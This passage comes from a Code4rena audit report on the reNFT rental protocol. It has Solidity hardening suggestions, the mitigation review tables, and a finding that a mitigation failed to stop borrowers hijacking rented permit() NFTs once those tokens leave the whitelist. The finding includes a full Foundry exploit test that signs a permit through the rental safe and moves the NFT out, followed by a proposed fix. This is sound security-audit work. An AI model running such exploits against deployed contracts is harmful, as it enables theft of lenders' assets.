       return IERC165(token).supportsInterface(type(IERC721).interfaceId);
   }

   function isERC1155(address token) internal view returns (bool) {
       return IERC165(token).supportsInterface(type(IERC1155).interfaceId);
   }
   ```

     **Enhanced Transaction Validation**: In the `_checkTransaction` function, use the above compliance checks before processing ERC-721 or ERC-1155 related transactions. For example:
   
      ```solidity
      if (selector == e721_safe_transfer_from_selector) {
          require(isERC721(to), "Invalid ERC721 token");
          // existing logic...
      } else if (selector == e1155_safe_transfer_from_selector) {
          require(isERC1155(to), "Invalid ERC1155 token");
          // existing logic...
      }
      ```

3. Refactoring the `deployRentalSafe` function in `Factory.sol` involves splitting its complex logic into smaller, focused functions for enhanced clarity and maintainability. This process includes creating distinct functions for validating the threshold requirement, constructing the initializer payload for the Gnosis safe setup, and handling the actual deployment of the safe proxy. Each function should have a clear, descriptive name and be accompanied by comprehensive documentation. After refactoring, thorough unit testing for each new function is essential to ensure their individual and integrated functionality within the `deployRentalSafe` process. This approach makes the codebase more readable, easier to debug, and simplifies future updates or maintenance efforts.
This approach ensures that the `Guard.sol` contract only interacts with compliant ERC-721 and ERC-1155 tokens, thus mitigating risks associated with non-standard implementations. Additionally, regular audits and reviews of the contract's interaction with token contracts can further enhance security.

4. The absence of a pause function (or circuit breaker) in critical contracts like Admin.sol could be a potential point of failure, especially in emergency situations. Integrating circuit breakers or a pause mechanism into `Admin.sol`, specifically for functions like `freezeStorage` and `freezePaymentEscrow`, would enhance security. This can be achieved by adding a `paused` state variable and a modifier to check this state. The modifier would prevent function execution when the contract is paused:
   
   ```solidity
   bool private paused = false;
   
   modifier whenNotPaused() {
       require(!paused, "Contract is paused");
       _;
   }
   
   function pause() external onlyRole("ADMIN_ADMIN") {
       paused = true;
   }
   
   function unpause() external onlyRole("ADMIN_ADMIN") {
       paused = false;
   }
   
   function freezeStorage() external onlyRole("ADMIN_ADMIN") whenNotPaused {
       // existing logic
   }
   
   function freezePaymentEscrow() external onlyRole("ADMIN_ADMIN") whenNotPaused {
       // existing logic
   }
   ```
   This design allows the admin to halt critical functionalities in emergencies, thus preventing potential exploits or damage when vulnerabilities are detected. The implementation should ensure that the pause functionality is well-protected and accessible only to authorized roles to prevent misuse.

5. In `Create.sol`, specifically in the function `_processBaseOrderOffer`, there's potential for optimization in the loop that processes each offer item. Here's a technical breakdown and recommendation:

   The loop iterates over the `offers` array to handle ERC721 and ERC1155 items. One optimization strategy could be pre-computing and storing frequently accessed values, such as `itemType`, outside the loop. This reduces the need for repeated calculations or lookups within each iteration, saving gas:

   ```solidity
   for (uint256 i; i < offers.length; ++i) {
       SpentItem memory offer = offers[i];
       
       // Potential optimization: Pre-compute common conditions or values here
   
       if (offer.isERC721()) {
           // Logic for ERC721
       } else if (offer.isERC1155()) {
           // Logic for ERC1155
       } else {
           // Error handling
       }
   }
   ```
      
      This optimization targets the repeated checks within the loop, such as `offer.isERC721()` and `offer.isERC1155()`, potentially reducing the computational cost of these operations. However, it's crucial to balance readability and maintainability with optimization. Each optimization should be thoroughly tested to ensure it doesn't introduce new issues or complexities.

### Time spent:
22 hours

**[Alec1017 (reNFT) acknowledged](https://github.com/code-423n4/2024-01-renft-findings/issues/582#issuecomment-1910739485)**

***

# [Mitigation Review](#mitigation-review)

## Introduction

Following the C4 audit, 3 wardens, [sin1st3r\_\_](https://code4rena.com/@sin1st3r__), [juancito](https://code4rena.com/@juancito) and [EV\_om](https://code4rena.com/@EV_om), reviewed the mitigations for all identified issues. Additional details can be found within the [C4 reNFT Mitigation Review repository](https://github.com/code-423n4/2024-02-renft-mitigation).

## Overview of Changes

**[Summary from the Sponsor](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#overview-of-changes):**

### Token Whitelist

A token whitelist has been implemented to filter the tokens that are supported by the protocol. There are two whitelists: asset whitelist and payment whitelist.

For the asset whitelist, please assume that only "standard" ERC721/ERC1155 tokens will be added to this whitelist. The only exceptions to this are the burnable token extension and tokens that support `permit()` ([EIP-4494](https://eips.ethereum.org/EIPS/eip-4494)). Any vulnerabilities found that involves that functionality *will* be considered in scope.

For the payment whitelist, please assume that only "standard" ERC20 tokens will be added to this whitelist. More specifically, we will plan to support: DAI, USDC, USDT. Other payment tokens will be considered out of scope.

> In terms of what "standard" means, think of the Open Zeppelin implementations of these tokens. We will not be whitelisting any tokens that deviate too far from how we expect an ERC721/ERC1155/ERC20 token to behave.

### Custom Fallback Handler

A custom fallback handler has been implemented on all rental safes upon deployment. This fallback handler should never be allowed to be removed by an owner of a rental safe. Additionally, it should be able to prevent tokens that support `permit()` from being able to gaslessly approve another account to transfer assets out of the rental safe. The current implementation prevents all eip-1271 signatures that originate from assets that are on the active whitelist, which is intended behavior.

### Rental Creation Flow

The process of creating a rental has been slightly altered. Now, all tokens *must* be sent to the Create Policy when creating an order. From there, the Create Policy will perform accounting, set up the rental order, and then distribute the tokens to the correct parties. 

Any vulnerabilities that can demonstrate that the assets go to the wrong addresses, pass execution flow to another account while in possession of the rented asset but before it has been registered by the protocol, or can break the internal accounting of the payment system will be much appreciated. 

> Vulnerabilities that stem from Seaport will be considered in scope if they can be demonstrated to directly affect this protocol

### Maximum Rental Duration

A maximum rental duration has been introduced to prevent locking up assets for an unreasonable amount of time. Please assume that the maximum rental duration for any order is set to 21 days. 

### Replayability

Steps have been taken to prevent replayability of the co-signer's signature. Each `RentPayload` will now contain an order hash of the seaport order that it is intended for. Additionally, partial orders from seaport will not be supported by the protocol and will revert execution if a partial order is seen. With these two changes, we hope to ensure that one `RentPayload` can only be used one time and to fulfill only one unique seaport order. 

Any vulnerabilities that can show the same `RentPayload` being used either with 2 different order hashes or the same order hash more than once will be welcomed.

## Mitigation Review Scope

| URL | Mitigation of | Purpose | 
| ----------- | ------------- | ----------- |
| https://github.com/re-nft/smart-contracts/pull/7 | H-01, M-05, M-12 | Implements a whitelist so only granted assets can be used in the protocol | 
| https://github.com/re-nft/smart-contracts/pull/17 | H-01, M-05, M-12 | Implements batching functionality for whitelisting tokens so that multiple can be added at once | 
| https://github.com/re-nft/smart-contracts/pull/4 | H-02 | Adds check to prevent setting of the fallback handler by the safe owner | 
| https://github.com/re-nft/smart-contracts/pull/14 | H-03, H-06 | Introduces an intermediary transfer on rental creation to ensure assets are not sent to the safe until they have been registered as rented by the protocol | 
| https://github.com/re-nft/smart-contracts/pull/1 | H-04 | Fixes offset value so that the proper address is checked when disabling a gnosis module from a safe | 
| - | H-05 | Mitigation of this issue is the result of mitigating a handful of other findings (H-07, M-13, M-11, M-06) |
| https://github.com/re-nft/smart-contracts/pull/10 | H-07, M-13 | Prevents `RentPayload` replayability and ensures that orders must be unique by disallowing partial orders from seaport |
| https://github.com/re-nft/smart-contracts/pull/8 | M-01 | Allows distinction between rented and non-rented ERC1155 tokens. Renters should be able to transfer amounts of these tokens that do not cut into the active rented amount |
| https://github.com/re-nft/smart-contracts/pull/11 | M-02 | Introduces support for rented tokens that use `Permit()` for gasless approvals. The rental safe should now be able to prevent gasless signatures from approving rented assets |
| https://github.com/re-nft/smart-contracts/pull/9 | M-04 | `onStart` and `onStop` hook functions are now independent of one another and do not both need to be implemented at the same time. |
| https://github.com/re-nft/smart-contracts/pull/13 | M-06 | Checks if a rental order exists right away when stopping a rental. Prevents stopping of an order that doesnt exist, only to create it during a callback in the `stopRent()` execution flow |
| https://github.com/re-nft/smart-contracts/pull/5 | M-08 | Added support for burnable ERC721 and ERC1155 tokens |
| https://github.com/re-nft/smart-contracts/pull/6 | M-09 | Allows native ETH to be transferred out of a rental safe |
| https://github.com/re-nft/smart-contracts/pull/12 | M-10 | Introduces `isActive` check on the guard policy. Ensures that safes cannot use a guard that has been deactivated |
| https://github.com/re-nft/smart-contracts/pull/2 | M-11 | Properly implements EIP-712 |
| https://github.com/re-nft/smart-contracts/pull/15 | M-16 | Introduces more granular controls over whitelist for extensions |

## Out of Scope

[[M-03]: Risk of DoS when stoping large rental orders due to block gas limit](https://github.com/code-423n4/2024-01-renft-findings/issues/538)<br>
[[M-07]: Upgrading modules via executeAction() will brick all existing rentals](https://github.com/code-423n4/2024-01-renft-findings/issues/397)<br>
[[M-14]: Lender of a PAY order lending can grief renter of the payment](https://github.com/code-423n4/2024-01-renft-findings/issues/65)<br>
[[M-15]: Blocklisting in payment ERC20 can cause rented NFT to be stuck in Safe](https://github.com/code-423n4/2024-01-renft-findings/issues/64)

## Mitigation Review Summary

| Original Issue | Status | Full Details |
| --- | --- | --- |
| H-01 |  🟢 Mitigation Confirmed | Reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/2), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/41) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/30) |
| H-02 |  🟢 Mitigation Confirmed | Reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/42), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/31) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/3) |
| H-03 |  🟢 Mitigation Confirmed | Reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/43), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/32) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/4) |
| H-04 |  🟢 Mitigation Confirmed | Reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/5), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/44) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/33) |
| H-05 |  🟢 Mitigation Confirmed | Reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/45), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/34) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/6) |
| H-06 |  🟢 Mitigation Confirmed | Reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/7), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/46) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/35) |
| H-07 |  🟢 Mitigation Confirmed | Reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/8), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/47) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/36) |
| M-01 |  🟢 Mitigation Confirmed | Reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/9), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/48) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/37) |
| M-02 |  🔴 Mitigation Error | Reports from  [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/26) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/10) |
| M-04 |  🟢 Mitigation Confirmed | Reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/11) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/38) |
| M-05 |  🟢 Mitigation Confirmed | Reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/51), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/39) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/12) |
| M-06 |  🟢 Mitigation Confirmed | Reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/13), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/52) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/40) |
| M-08 |  🟢 Mitigation Confirmed | Reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/53), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/55) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/14) |
| M-09 |  🟢 Mitigation Confirmed | Reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/54) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/56) |
| M-10 |  🔴 Mitigation Error | Report from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/61) |
| M-11 |  🟢 Mitigation Confirmed | Reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/17), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/62) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/58) |
| M-12 |  🟢 Mitigation Confirmed | Reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/64) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/59) |
| M-13 |  🟢 Mitigation Confirmed | Reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/19), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/65) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/60) |
| M-16 |  🔴 Unmitigated | Report from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/20) |

**The wardens confirmed the mitigations for all in-scope findings except for M-02 (High severity mitigation error), M-10 (Medium severity mitigation error) and M-16 (Unmitigated). They also surfaced several new issues: 2 High severity, 1 Medium severity and [1 Low severity](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/67). See below for additional details**

***

## [M-02 Mitigation Error](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/26)

*Submitted by [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/26), and also [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/10)*

Original Issue: [A malicious borrower can hijack any NFT with `permit()` function he rents.](https://github.com/code-423n4/2024-01-renft-findings/issues/587)

### Lines of code

https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Fallback.sol#L116

### Mitigation Status

Partially mitigated

### Summary of the previously found to-be-mitigated vulnerability

In summary, the previous version of the codebase allowed the hijacking of any rented NFT with the `permit()` functionality. What allowed the vulnerability to occur is that there were no checks or validation during the signature validation step (where the ERC721Permit reached out to the owner of the rented NFT (borrower rental safe), and asked it if the supplied signature is indeed a signature made by an owner of the rental safe (EIP-1271)). The execution flow of the exploit was as follows:

1. The attacker would borrow a NFT supporting `permit()`, and at this point, he would be the owner of the NFT.
2. The attacker would generate a signature allowing another entity he controls, to transfer/act upon the target NFT on his behalf.
3. The attacker would call `permit()` on the NFT and feed it the created signature.
4. The NFT contract will reach out to the owner of the NFT; in this case, it's the Gnosis rental safe owned by the attacker. Then it'll provide it with the signature the attacker supplied and ask it if this is a signature made by an owner of the gnosis safe. `isValidSignature`.
5. Gnosis safe will find out that indeed the signature is made by the owner of the safe (attacker) and will respond back with the 4 byte `EIP1271 magic value`.
6. The NFT contract will approve the entity the attacker specified to spend the attacker's token on behalf of him.
7. From the attacker-controlled & approved address, the attacker will transfer the NFT token from his rental safe using `transferFrom`.

Execution flow:

    1. NFT::permit(...) [`msg.sender` == attacker]
        -> GnosisSafe::isValidSignature [`msg.sender` == NFT contract]
            -> GnosisSafe::FallbackHandler::isValidSignature [`msg.sender` == Gnosis safe]
                -> FallbackHandler::isValidSignature -> `OK`
        -> NFT::_approve(spender, tokenId)
    
    2. NFT::transferFrom(rentalSafe, attacker, tokenId)

### Mitigation Analysis

Sponsors introduced a new `Policy` contract named [`Fallback.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Fallback.sol), set this contract to be the default fallback handler of the rental gnosis safe and prevented the rental safe owner [from setting a fallback handler](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Guard.sol#L363).

Additionally, in the [`Fallback.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Fallback.sol) policy contract, they introduced a modified version of the EIP1271 function `isValidSignature()` (which was present in previous fallback handlers). 

```solidity
    function isValidSignature(
        bytes memory data,
        bytes memory signature
    ) public view override returns (bytes4) {
        // Check if this fallback is active for the protocol.
        if (!isActive) {
            revert Errors.FallbackPolicy_Deactivated();
        }

        // Get the original sender. This is the address that called the safe.
        address originalSender = _msgSender();

        // Determine if the original sender is a token that has been whitelisted.
        if (STORE.whitelistedAssets(originalSender)) {
            revert Errors.FallbackPolicy_UnauthorizedSender(originalSender);
        }

        // Caller should be a Safe.
        Safe safe = Safe(payable(msg.sender));

        // Convert the data into a safe-compatible hash.
        bytes32 messageHash = getMessageHashForSafe(safe, data);

        // Check if the signature was signed by an owner of the safe.
        if (signature.length == 0 && safe.signedMessages(messageHash) == 0) {
            revert Errors.FallbackPolicy_HashNotSigned(messageHash);
        } else {
            safe.checkSignatures(messageHash, data, signature);
        }

        return EIP1271_MAGIC_VALUE;
    }
```

In the modified `isValidSignature` function, it checks if the token that is trying to request signature verification (in this case, the `permitNFT`), is whitelisted or not. If it's whitelisted, then the function will revert, preventing the hijacking of the permit NFT since the hijacking relies on the signature validation phase passing. If it's blacklisted, it'll normally allow the signature validation. This check does not differentiate between rented and non-rented tokens (as the sponsor noted in the README and mentioned that it's expected behavior). As long as the NFT is whitelisted, no signature verifications will be allowed for it.

### The Vulnerability

Looking closely at the check introduced in the new `isValidSignature()` function, there appears to be no check if a permit NFT token is blacklisted and is rented at the same time, which allows rented permit NFT tokens to be hijacked at any moment if the admins decide to blacklist the token.

```solidity

        ........

        // Determine if the original sender is a token that has been whitelisted.
        if (STORE.whitelistedAssets(originalSender)) {
            revert Errors.FallbackPolicy_UnauthorizedSender(originalSender);
        }

        ........
```

Imagine the following scenario:
1. Permit NFT token is whitelisted.
2. Bob rents Permit NFT from Alice.
3. During the rental duration, the admin decides to blacklist the Permit NFT token.
4. At this point, Bob can maliciously hijack the permit NFT and move it out of his safe!

### Coded PoC

To run the PoC, you'll need to do the following:
1. You'll need to add this file to the `test/` folder:  
    - `Exploit.sol` -> File containing the PoC.
2. You'll need to run this command: `forge test --mt test_NFT_Permit_Exploit -vv`.


**The file:**

<details>
<summary><b>Exploit.sol</b></summary>



    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        OfferItem,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {OfferItemLib} from "@seaport-sol/SeaportSol.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";

    import {BaseTest} from "@test/BaseTest.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is Assertions, Constants, BaseTest {

        using OfferItemLib for OfferItem;

        function test_NFT_Permit_Exploit() public {

            NFTWithPermit permitNFT = new NFTWithPermit();

            vm.startPrank(deployer.addr);
            admin.toggleWhitelistAsset(address(permitNFT), true);
            vm.stopPrank();

            // The NFT token which Alice, the lender, will offer.
            permitNFT.safeMint(alice.addr, 1);

            // Approve seaport conduit to spend the token.
            vm.prank(alice.addr);
            permitNFT.approve(address(conduit), 1);

            /////////////////////////////////////////////
            // Order Creation & Fulfillment simulation //
            /////////////////////////////////////////////

            // Alice creates a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // Remove the pre-inserted offer item (which is inserted by the tests)
            popOfferItem();

            // Set the NFT which we created as the offer item
            withOfferItem(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC721)
                        .withToken(address(permitNFT))
                        .withIdentifierOrCriteria(1)
                        .withStartAmount(1)
                        .withEndAmount(1)
            );

            // Finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();
            

            // Create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // Finalize the base order fulfillment
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            // get the rental order hash
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);

            // assert that the rental order was stored
            assertEq(STORE.orders(rentalOrderHash), true);

            // assert that the ERC1155 is in the rental wallet of the fulfiller
            assertEq(permitNFT.balanceOf(address(bob.safe)), 1);


            /** ------------------- Exploitation ------------------- */

            // Simulate the Permit NFT asset getting blacklisted!
            vm.startPrank(deployer.addr);
            admin.toggleWhitelistAsset(address(permitNFT), false);
            vm.stopPrank();

            // Impersonate the attacker
            vm.startPrank(bob.addr);

            // The digest which will be hashed by gnosis then signed by the attacker (owner of the safe).
            // The format of this digest is taken from the `permit()` function.
            bytes memory digest = bytes.concat(
                keccak256(
                    abi.encodePacked(
                        '\x19\x01',
                        permitNFT.DOMAIN_SEPARATOR(),
                        keccak256(
                            abi.encode(
                                permitNFT.PERMIT_TYPEHASH(), 
                                bob.addr, // spender
                                1, // the token Id
                                permitNFT.tokenIdNonces(1), // get the nonce for the token ID "1"
                                block.timestamp + 10000000 // deadline until which, the call to `permit()` with this signature will be allowed.
                            )
                        )
                    )
                )
            );        
            
            // Get the message hash for the digest.
            bytes32 msgHash = fallbackPolicy.getMessageHashForSafe(bob.safe, digest);

            // Sign the hashed message and get the signature (r, s, v).
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(bob.privateKey, msgHash);

            permitNFT.permit(
                bob.addr, 
                1, 
                block.timestamp + 10000000, 
                v, 
                r, 
                s
            );

            // Transfer the NFT from the attacker's safe to the attacker's address. This is the final stage of the exploit
            permitNFT.transferFrom(address(bob.safe), address(bob.addr), 1);

            vm.stopPrank();

            /** -------------- Final checks -------------- */

            uint256 attackersBalance = permitNFT.balanceOf(address(bob.addr));
            uint256 attackersSafeBalance = permitNFT.balanceOf(address(bob.safe));

            if (attackersSafeBalance == 0 && attackersBalance == 1) {
                console.log("Tokens successfully hijacked from the attacker's (borrower) safe!");
            }

        }

    }





    // Serves as a replacement for openzeppelin's `isContract` function which `ERC721Permit` relies on, simply because the currently installed openzeppelin version (5.0) for this PoC setup no longer 
    includes the function `isContract` in the `Address` library.
    library Address {
        function isContract(address account) internal view returns (bool) {
            // This method relies on extcodesize, which returns 0 for contracts in
            // construction, since the code is only stored at the end of the
            // constructor execution.

            uint256 size;
            assembly {
                size := extcodesize(account)
            }
            return size > 0;
        }
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/ChainId.sol
    /// @title Function for getting the current chain ID
    library ChainId {
        /// @dev Gets the current chain ID
        /// @return chainId The current chain ID
        function get() internal view returns (uint256 chainId) {
            assembly {
                chainId := chainid()
            }
        }
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/interfaces/external/IERC1271.sol
    /// @title Interface for verifying contract-based account signatures
    /// @notice Interface that verifies provided signature for the data
    /// @dev Interface defined by EIP-1271
    interface IERC1271 {
        /// @notice Returns whether the provided signature is valid for the provided data
        /// @dev MUST return the bytes4 magic value 0x1626ba7e when function passes.
        /// MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5).
        /// MUST allow external calls.
        /// @param hash Hash of the data to be signed
        /// @param signature Signature byte array associated with _data
        /// @return magicValue The bytes4 magic value 0x1626ba7e
        function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4 magicValue);
    }

    /// @title ERC721 with permit
    /// @notice Extension to ERC721 that includes a permit function for signature based approvals
    interface IERC721Permit is IERC721 {
        /// @notice The permit typehash used in the permit signature
        /// @return The typehash for the permit
        function PERMIT_TYPEHASH() external pure returns (bytes32);

        /// @notice The domain separator used in the permit signature
        /// @return The domain seperator used in encoding of permit signature
        function DOMAIN_SEPARATOR() external view returns (bytes32);

        /// @notice Approve of a specific token ID for spending by spender via signature
        /// @param spender The account that is being approved
        /// @param tokenId The ID of the token that is being approved for spending
        /// @param deadline The deadline timestamp by which the call must be mined for the approve to work
        /// @param v Must produce valid secp256k1 signature from the holder along with `r` and `s`
        /// @param r Must produce valid secp256k1 signature from the holder along with `v` and `s`
        /// @param s Must produce valid secp256k1 signature from the holder along with `r` and `v`
        function permit(
            address spender,
            uint256 tokenId,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external payable;
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/ERC721Permit.sol
    /// @title ERC721 with permit
    /// @notice Nonfungible tokens that support an approve via signature, i.e. permit
    abstract contract ERC721Permit is ERC721, IERC721Permit {
        /// @dev Gets the current nonce for a token ID and then increments it, returning the original value
        function _getAndIncrementNonce(uint256 tokenId) internal virtual returns (uint256);

        /// @dev The hash of the name used in the permit signature verification
        bytes32 private immutable nameHash;

        /// @dev The hash of the version string used in the permit signature verification
        bytes32 private immutable versionHash;

        /// @notice Computes the nameHash and versionHash
        constructor(
            string memory name_,
            string memory symbol_,
            string memory version_
        ) ERC721(name_, symbol_) {
            nameHash = keccak256(bytes(name_));
            versionHash = keccak256(bytes(version_));
        }

        /// @inheritdoc IERC721Permit
        function DOMAIN_SEPARATOR() public view override returns (bytes32) {
            return
                keccak256(
                    abi.encode(
                        // keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)')
                        0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,
                        nameHash,
                        versionHash,
                        ChainId.get(),
                        address(this)
                    )
                );
        }

        /// @inheritdoc IERC721Permit
        /// @dev Value is equal to keccak256("Permit(address spender,uint256 tokenId,uint256 nonce,uint256 deadline)");
        bytes32 public constant override PERMIT_TYPEHASH =
            0x49ecf333e5b8c95c40fdafc95c1ad136e8914a8fb55e9dc8bb01eaa83a2df9ad;

        /// @inheritdoc IERC721Permit
        function permit(
            address spender,
            uint256 tokenId,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external payable override {
            require(block.timestamp <= deadline, 'Permit expired');

            bytes32 digest =
                keccak256(
                    abi.encodePacked(
                        '\x19\x01',
                        DOMAIN_SEPARATOR(),
                        keccak256(abi.encode(PERMIT_TYPEHASH, spender, tokenId, _getAndIncrementNonce(tokenId), deadline))
                    )
                );
            address owner = ownerOf(tokenId);
            require(spender != owner, 'ERC721Permit: approval to current owner');

            if (Address.isContract(owner)) {
                require(IERC1271(owner).isValidSignature(digest, abi.encodePacked(r, s, v)) == 0x1626ba7e, 'Unauthorized');
            } else {
                address recoveredAddress = ecrecover(digest, v, r, s);
                require(recoveredAddress != address(0), 'Invalid signature');
                require(recoveredAddress == owner, 'Unauthorized');
            }

            _approve(spender, tokenId);
        }
    }


    contract NFTWithPermit is ERC721, ERC721Permit, Ownable {
        
        mapping(uint256 tokenId => uint256 nonce) public tokenIdNonces;

        constructor() ERC721Permit("MyNFT", "MNFT", "1.1") Ownable(msg.sender) {}

        function _getAndIncrementNonce(uint256 tokenId) internal override returns (uint256) {

            uint256 tokenIdNonce = tokenIdNonces[tokenId];

            tokenIdNonces[tokenId] += 1;

            return tokenIdNonce;
        }

        function safeMint(address to, uint256 tokenId) public onlyOwner {
            _safeMint(to, tokenId);
        }

    }

</details>

### Coded Remediation

Replace each of the following files with the modified ones listed below: `Stop.sol`, `Create.sol`, `Storage.sol`, `Fallback.sol`.

What this mitigation does is that it simply prevents any signature verification of a blacklisted token as long as there rentals active involving this blacklisted token. The implementation is as follows: A newly-introduced state mapping variable `mapping(address erc721Token => uint256 count) public rentedERC721s;` in the storage is updated during both, the creation and the termination of a rental. Additionally, in `isValidSignature::Fallback.sol`, it's checked if the `originalSender` is a blacklisted NFT, if that's the case, then check if `rentedERC721s[originalSender]` returns more than zero, if that's the case, then that means that there are permit nft rentals still in the storage -> revert.

After adding the files, don't forget to modify the unit tests for them to work properly. Rest of the tests are fine. Re-running the exploit after making the suggested modifications will fail.

**The files**

<details>
<summary><b>Stop.sol</b></summary>


    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {Enum} from "@safe-contracts/common/Enum.sol";
    import {LibString} from "@solady/utils/LibString.sol";

    import {ISafe} from "@src/interfaces/ISafe.sol";
    import {IHook} from "@src/interfaces/IHook.sol";

    import {Kernel, Policy, Permissions, Keycode} from "@src/Kernel.sol";
    import {toKeycode} from "@src/libraries/KernelUtils.sol";
    import {RentalUtils} from "@src/libraries/RentalUtils.sol";
    import {Signer} from "@src/packages/Signer.sol";
    import {Reclaimer} from "@src/packages/Reclaimer.sol";
    import {Accumulator} from "@src/packages/Accumulator.sol";
    import {Storage} from "@src/modules/Storage.sol";
    import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {Events} from "@src/libraries/Events.sol";
    import {
        Item,
        RentalOrder,
        Hook,
        OrderType,
        ItemType,
        RentalId,
        RentalAssetUpdate
    } from "@src/libraries/RentalStructs.sol";

    /**
    * @title Stop
    * @notice Acts as an interface for all behavior related to stoping a rental.
    */
    contract Stop is Policy, Signer, Reclaimer, Accumulator {
        using RentalUtils for Item;
        using RentalUtils for Item[];
